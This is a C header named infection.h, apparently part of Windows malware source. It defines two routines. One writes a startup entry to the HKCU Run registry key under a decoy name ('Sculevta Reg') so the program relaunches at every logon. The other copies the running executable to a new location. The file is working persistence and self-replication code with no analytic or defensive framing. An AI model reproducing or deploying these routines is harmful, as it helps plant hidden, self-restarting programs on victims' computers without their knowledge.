/*
 * infection.h
 *
 *  Created on: Jul 4, 2014
 */

#ifndef INFECTION_H_
#define INFECTION_H_

#ifndef UTILS_H_
#include "utils.h"
#endif

#define CONST_REGISTRY_RUN 			"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define CONST_REGISTRY_FAKE_NAME 	"Sculevta Reg"

/**
 * InfectRegistry.
 *
 * Add entry to Software\Microsoft\Windows\CurrentVersion\Run
 */
BOOL infectRegistry(char *value) {
	HKEY key;

	// Open key
	if (RegOpenKey(HKEY_CURRENT_USER, CONST_REGISTRY_RUN, &key) != 0)
		return FALSE;

	// Write on it
	if (RegSetValueEx(key, CONST_REGISTRY_FAKE_NAME, 0, REG_SZ,
			(LPBYTE) value, strlen(value)) != 0)
		return FALSE;

	// Close key
	RegCloseKey(key);

	return TRUE;
}

/**
 * InfectStorage.
 *
 * Selfcopy of program.
 */
BOOL infectStorage(char *file) {
	char self[1024];

	// Find self path
	if(!findSelfPath(self)) return FALSE;

	// Coping file
	if(!copyFile(self, file)) return FALSE;

	return TRUE;
}

#endif /* INFECTION_H_ */
